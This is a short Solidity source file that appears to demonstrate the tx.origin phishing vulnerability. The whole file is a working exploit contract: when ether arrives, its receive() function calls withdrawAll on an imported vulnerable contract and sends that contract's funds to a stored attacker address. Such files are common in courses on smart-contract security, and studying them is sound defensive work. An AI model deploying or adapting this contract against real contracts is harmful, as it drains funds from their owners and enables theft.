// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;

import "./tx_origin_attack.sol";

contract AttackContract{
    tx_origin txContract;
    address payable attacker;

    constructor(tx_origin _txoriginaddress,address payable _attacker){
        txContract = _txoriginaddress;
        attacker = _attacker;
    }

    receive() external payable {
        txContract.withdrawAll(attacker);
    }
}
